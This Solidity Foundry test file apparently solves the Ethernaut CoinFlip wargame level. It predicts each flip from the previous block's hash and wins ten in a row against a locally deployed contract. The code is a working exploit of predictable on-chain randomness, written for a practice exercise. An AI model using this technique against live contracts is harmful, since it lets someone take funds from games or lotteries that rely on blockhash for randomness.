// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../03_CoinFlip/CoinFlip.sol";

contract CoinFlipTest is Test {
    uint256 FACTOR;
    CoinFlip public target;
    uint256 requiredWins;
    address public attacker;

    function setUp() public {
        target = new CoinFlip();
        FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        requiredWins = 10; // Set the number of consecutive wins required
        attacker = vm.addr(1); // makeAddr("attacker");
        vm.deal(attacker, 1 ether); // give attacker some ether  // No need for this level
    }
    function guess() public returns (bool) {
        // Vulnerability: blockhash(block.number - 1) is publicly accessible
        console.log("Using the block number ", block.number - 1);
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 side = blockValue / FACTOR;
        return side == 1 ? true : false;
    }

    function test_exploit() public {
        console.log("Starting exploiting CoinFlip...");
        assertEq(target.consecutiveWins(), 0);

        for (uint256 i = 1; i <= requiredWins; i++) {
            vm.startPrank(attacker);
            bool gues = guess();
            console.log("Guessing: ", gues);
            assertTrue(target.flip(gues), "Flip failed");
            assertEq(target.consecutiveWins(), i, "Exploit failed: Consecutive wins not incremented");
            vm.stopPrank();
            // Simulate the passage of time to the next block, otherwise it reverts, if (lastHash == blockValue)
            vm.roll(block.number + 1);
            console.log("Current consecutive wins: ", target.consecutiveWins());
        }
        assertEq(target.consecutiveWins(), requiredWins, "Exploit failed: Consecutive wins not reached");
    }
}
